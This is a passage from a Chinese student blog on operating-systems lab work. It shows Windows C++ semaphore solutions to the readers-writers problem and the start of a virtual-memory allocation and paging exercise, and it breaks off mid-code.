<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TRD 255</span></span><br><span class="line"><span class="type">int</span> trd_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">info</span>&#123;</span><br><span class="line">    <span class="type">int</span> ord;    <span class="comment">// 线程号</span></span><br><span class="line">    <span class="type">int</span> beg;    <span class="comment">// 开始时间</span></span><br><span class="line">    <span class="type">int</span> pause;  <span class="comment">// 持续时间</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> read_count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> write_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE rec, red, wfr, wte;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">write</span><span class="params">(LPVOID param)</span></span>&#123;   <span class="comment">// 写者</span></span><br><span class="line">    info *pam = (info*)param;</span><br><span class="line">    <span class="type">int</span> beg = pam-&gt;beg, pause = pam-&gt;pause, ord = pam-&gt;ord;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer thread %d is created.\n&quot;</span>, ord, beg);</span><br><span class="line">    <span class="built_in">Sleep</span>(beg); <span class="comment">// beg秒后启动</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(wte, INFINITE);</span><br><span class="line">    write_count += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(write_count == <span class="number">1</span>)&#123;   <span class="comment">// 第一位(等待/执行)的写者占用优先锁</span></span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(wfr, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(wte, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer thread %d applys for the resource.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(rec, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer thread %d is writing.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">Sleep</span>(pause);   <span class="comment">// 操作持续时间</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer thread %d ends.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(wte, INFINITE);</span><br><span class="line">    write_count -= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(write_count == <span class="number">0</span>)&#123;   <span class="comment">// 最后一位执行的写者释放优先锁</span></span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(wfr, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(wte, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer thread %d releases the resource.\n&quot;</span>, ord);   </span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(rec, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">read</span><span class="params">(LPVOID param)</span></span>&#123;   <span class="comment">// 读者</span></span><br><span class="line">    info *pam = (info*)param;</span><br><span class="line">    <span class="type">int</span> beg = pam-&gt;beg, pause = pam-&gt;pause, ord = pam-&gt;ord;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reader thread %d is created.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">Sleep</span>(beg); <span class="comment">// beg秒后启动</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(wfr, INFINITE);   <span class="comment">// 有无加入申请资源队列的资格</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(red, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    read_count += <span class="number">1</span>;    <span class="comment">// 写者数量</span></span><br><span class="line">    <span class="keyword">if</span>(read_count == <span class="number">1</span>)&#123;    <span class="comment">// 第一位读者申请资源</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reader thread %d applys for the resource.\n&quot;</span>, ord);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(rec, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(red, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放读者数量</span></span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(wfr, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 不抢占优先锁，只检测是否被占用，若不被占用则有申请资源的资格，因而能算作&quot;队列中的读者&quot;，可以计数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reader thread %d is reading.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">Sleep</span>(pause);   <span class="comment">// 操作持续时间</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reader thread %d ends.\n&quot;</span>, ord);  </span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(red, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    read_count -= <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span>(read_count == <span class="number">0</span>)&#123;    <span class="comment">// 最后一位读者释放资源</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reader thread %d releases the resource.\n&quot;</span>, ord);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(rec, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(red, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放读者数量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    rec = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;resource&quot;</span>));</span><br><span class="line">    red = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;reader&quot;</span>));</span><br><span class="line">    wfr = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;writerFirst&quot;</span>));</span><br><span class="line">    wte = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;writer&quot;</span>));</span><br><span class="line">    info *tmp;</span><br><span class="line">    HANDLE trd[MAX_TRD]; </span><br><span class="line">    </span><br><span class="line">    fstream input;</span><br><span class="line">    input.<span class="built_in">open</span>(<span class="string">&quot;./input.txt&quot;</span>, ios::in);</span><br><span class="line">    string str;</span><br><span class="line">    <span class="keyword">while</span>(!input.<span class="built_in">eof</span>())&#123;</span><br><span class="line">        string met;</span><br><span class="line">        <span class="type">int</span> ord, beg, pause;</span><br><span class="line">        input&gt;&gt;ord;</span><br><span class="line">        <span class="keyword">if</span>(input.<span class="built_in">eof</span>())&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        input&gt;&gt;met;</span><br><span class="line">        input&gt;&gt;beg;</span><br><span class="line">        input&gt;&gt;pause;</span><br><span class="line">        tmp = <span class="keyword">new</span> <span class="built_in">info</span>();</span><br><span class="line">        tmp-&gt;ord = ord;</span><br><span class="line">        tmp-&gt;beg = beg*<span class="number">1000</span>;</span><br><span class="line">        tmp-&gt;pause = pause*<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">if</span>(met == <span class="string">&quot;W&quot;</span>)&#123;</span><br><span class="line">            trd[trd_count] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, write, tmp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            trd_count += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(met == <span class="string">&quot;R&quot;</span>)&#123;</span><br><span class="line">            trd[trd_count] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, read, tmp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            trd_count += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; trd_count; i++)&#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(trd[i], INFINITE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(trd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(rec);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(red);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>读者优先：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TRD 255</span></span><br><span class="line"><span class="type">int</span> trd_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">info</span>&#123;</span><br><span class="line">    <span class="type">int</span> ord;    <span class="comment">// 线程号</span></span><br><span class="line">    <span class="type">int</span> beg;    <span class="comment">// 开始时间</span></span><br><span class="line">    <span class="type">int</span> pause;  <span class="comment">// 持续时间</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> read_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE rec, red;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">write</span><span class="params">(LPVOID param)</span></span>&#123;   <span class="comment">// 写者</span></span><br><span class="line">    info *pam = (info*)param;</span><br><span class="line">    <span class="type">int</span> beg = pam-&gt;beg, pause = pam-&gt;pause, ord = pam-&gt;ord;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer %d is created.\n&quot;</span>, ord, beg);</span><br><span class="line">    <span class="built_in">Sleep</span>(beg); <span class="comment">// beg秒后启动</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer %d applys for the resource.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(rec, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer %d is writing.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">Sleep</span>(pause);   <span class="comment">// 操作持续时间</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Writer %d ends and releases the resource.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(rec, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放资源</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">read</span><span class="params">(LPVOID param)</span></span>&#123;   <span class="comment">// 读者</span></span><br><span class="line">    info *pam = (info*)param;</span><br><span class="line">    <span class="type">int</span> beg = pam-&gt;beg, pause = pam-&gt;pause, ord = pam-&gt;ord;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reader %d is created.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">Sleep</span>(beg); <span class="comment">// beg秒后启动</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(red, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    read_count += <span class="number">1</span>;    <span class="comment">// 写者数量</span></span><br><span class="line">    <span class="keyword">if</span>(read_count == <span class="number">1</span>)&#123;    <span class="comment">// 第一位读者申请资源</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reader %d applys for the resource.\n&quot;</span>, ord);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(rec, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(red, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放读者数量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reader %d is reading.\n&quot;</span>, ord);</span><br><span class="line">    <span class="built_in">Sleep</span>(pause);   <span class="comment">// 操作持续时间</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reader %d ends.\n&quot;</span>, ord);  </span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(red, INFINITE); <span class="comment">// 申请资源</span></span><br><span class="line">    read_count -= <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">if</span>(read_count == <span class="number">0</span>)&#123;    <span class="comment">// 最后一位读者释放资源</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Reader %d releases the resource.\n&quot;</span>, ord);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(rec, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ReleaseSemaphore</span>(red, <span class="number">1</span>, <span class="literal">NULL</span>); <span class="comment">// 释放读者数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    rec = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;resource&quot;</span>));</span><br><span class="line">    red = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;reader&quot;</span>));</span><br><span class="line">    info *tmp;</span><br><span class="line">    HANDLE trd[MAX_TRD]; </span><br><span class="line">    </span><br><span class="line">    fstream input;</span><br><span class="line">    input.<span class="built_in">open</span>(<span class="string">&quot;./input.txt&quot;</span>, ios::in);</span><br><span class="line">    string str;</span><br><span class="line">    <span class="keyword">while</span>(!input.<span class="built_in">eof</span>())&#123;</span><br><span class="line">        string met;</span><br><span class="line">        <span class="type">int</span> ord, beg, pause;</span><br><span class="line">        input&gt;&gt;ord;</span><br><span class="line">        <span class="keyword">if</span>(input.<span class="built_in">eof</span>())&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        input&gt;&gt;met;</span><br><span class="line">        input&gt;&gt;beg;</span><br><span class="line">        input&gt;&gt;pause;</span><br><span class="line">        tmp = <span class="keyword">new</span> <span class="built_in">info</span>();</span><br><span class="line">        tmp-&gt;ord = ord;</span><br><span class="line">        tmp-&gt;beg = beg*<span class="number">1000</span>;</span><br><span class="line">        tmp-&gt;pause = pause*<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">if</span>(met == <span class="string">&quot;W&quot;</span>)&#123;</span><br><span class="line">            trd[trd_count] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, write, tmp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            trd_count += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(met == <span class="string">&quot;R&quot;</span>)&#123;</span><br><span class="line">            trd[trd_count] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, read, tmp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            trd_count += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; trd_count; i++)&#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(trd[i], INFINITE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(trd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(rec);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(red);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Development</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Schoolwork</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实验三-内存分配与换页算法模拟</title>
    <url>/2023/05/29/Development/Algorithm/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E4%B8%89-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E6%8D%A2%E9%A1%B5%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h2 id="内存分配与跟踪"><a href="#内存分配与跟踪" class="headerlink" title="内存分配与跟踪"></a>内存分配与跟踪</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://blog.csdn.net/kongshuai19900505/article/details/51448270" >GetSystemInfo获取系统信息 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/theone10211024/article/details/14001943" >GetLastError返回值 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://learn.microsoft.com/zh-cn/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex" >微软GlobalMemoryStatusEx函数手册 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV 1024</span></span><br><span class="line"></span><br><span class="line">HANDLE trd1, trd2;</span><br><span class="line"></span><br><span class="line">SYSTEM_INFO SYS_INFO, *LPSYS_INFO = <span class="keyword">new</span> <span class="built_in">SYSTEM_INFO</span>();  <span class="comment">// 系统信息</span></span><br><span class="line"></span><br><span class="line">MEMORYSTATUSEX MEMSTATUS, *LPMEMSTATUS = <span class="keyword">new</span> <span class="built_in">MEMORYSTATUSEX</span>();   <span class="comment">// 内存信息</span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION CS;    <span class="comment">// 临界区</span></span><br><span class="line"></span><br><span class="line">LPVOID pS[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DWORD dPS = SYS_INFO.dwPageSize;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONEM 4*1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printSys</span><span class="params">()</span></span>&#123;     <span class="comment">// 输出系统信息</span></span><br><span class="line">    <span class="built_in">GetSystemInfo</span>(LPSYS_INFO);</span><br><span class="line">    SYSTEM_INFO *LP = LPSYS_INFO;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------System Info----------\n&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;dwOemId: %ld\n&quot;, LP-&gt;dwOemId);</span></span><br><span class="line">    <span class="comment">// printf(&quot;dwPageSize: %ld\n&quot;, LP-&gt;dwPageSize);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最小寻址单元: %p\n&quot;</span>, LP-&gt;lpMinimumApplicationAddress);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最大寻址单元: %p\n&quot;</span>, LP-&gt;lpMaximumApplicationAddress);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;处理器掩码: %ld\n&quot;</span>, LP-&gt;dwActiveProcessorMask);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;处理器个数: %ld\n&quot;</span>, LP-&gt;dwNumberOfProcessors);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;处理器类型: %ld\n&quot;</span>, LP-&gt;dwProcessorType);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配粒度: %ld\n&quot;</span>, LP-&gt;dwAllocationGranularity);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printMem</span><span class="params">()</span></span>&#123;     <span class="comment">// 输出内存信息</span></span><br><span class="line">    flag = <span class="built_in">GlobalMemoryStatusEx</span>(LPMEMSTATUS);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;获取内存信息出错: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LPMEMORYSTATUSEX LP = LPMEMSTATUS;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------Memory Info----------\n&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;dwLength: %ld\n&quot;, LP-&gt;dwLength);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已使用的物理内存: %ld\%\n&quot;</span>, LP-&gt;dwMemoryLoad);</span><br><span class="line">    <span class="comment">// printf(&quot;dwTotalPhys: %I64d\n&quot;, LP-&gt;ullTotalPhys);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;目前可使用的物理内存 (Bytes): %I64d\n&quot;</span>, (LP-&gt;ullAvailPhys));</span><br><span class="line">    <span class="comment">// printf(&quot;dwTotalPageFile: %I64d\n&quot;, LP-&gt;ullTotalPageFile);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;目前可提交的最大内存量 (Bytes): %I64d\n&quot;</span>, LP-&gt;ullAvailPageFile);</span><br><span class="line">    <span class="comment">// printf(&quot;dwTotalVirtual: %I64d\n&quot;, LP-&gt;ullTotalVirtual);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;目前可使用(未保留也未提交)的虚拟内存 (Bytes): %I64d\n&quot;</span>, LP-&gt;ullAvailVirtual);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">alloc</span><span class="params">(LPVOID)</span></span>&#123;</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配大小为4KB的虚拟内存区A并保留.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">0</span>] = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,ONEM,MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;提交保留的虚拟内存区A.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">0</span>] = <span class="built_in">VirtualAlloc</span>(pS[<span class="number">0</span>],ONEM,MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以PAGE_GUARD再次提交已经提交的虚拟内存区A.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">0</span>] = <span class="built_in">VirtualAlloc</span>(pS[<span class="number">0</span>],ONEM,MEM_COMMIT, PAGE_EXECUTE_READWRITE | PAGE_GUARD);    <span class="comment">// 得有基础策略，PAGE_GUARD才是一次性</span></span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配4KB的虚拟内存区B并以PAGE_NOACCESS提交.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">1</span>] = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,ONEM,MEM_RESERVE | MEM_COMMIT, PAGE_NOACCESS);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;分配4KB的虚拟内存C并以PAGE_NOCACHE提交.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">2</span>] = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,ONEM,MEM_RESERVE | MEM_COMMIT, PAGE_NOCACHE);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以MEM_RESET类型分配4KB的虚拟内存D.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">3</span>] = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,ONEM,MEM_RESET, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;以MEM_TOP_DOWN类型分配4KB的虚拟内存E并提交.\n&quot;</span>);</span><br><span class="line">    pS[<span class="number">4</span>] = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,ONEM,MEM_TOP_DOWN | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">LeaveCriticalSection</span>(&amp;CS);</span><br><span class="line"><span class="comment">//##########################################</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">EnterCriticalSection</span>(&amp;CS);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;对虚拟内存A上锁.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualLock</span>(pS[<span class="number">0</span>], ONEM);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;  <span class="comment">// 上锁出错</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; 上锁出错: A受到PAGE_GUARD的一次性访问保护\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再次对虚拟内存A上锁.\n&quot;</span>);</span><br><span class="line">    flag = <span class="built_in">VirtualLock</span>(pS[<span class="number">0</span>], ONEM);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;  <span class="comment">// 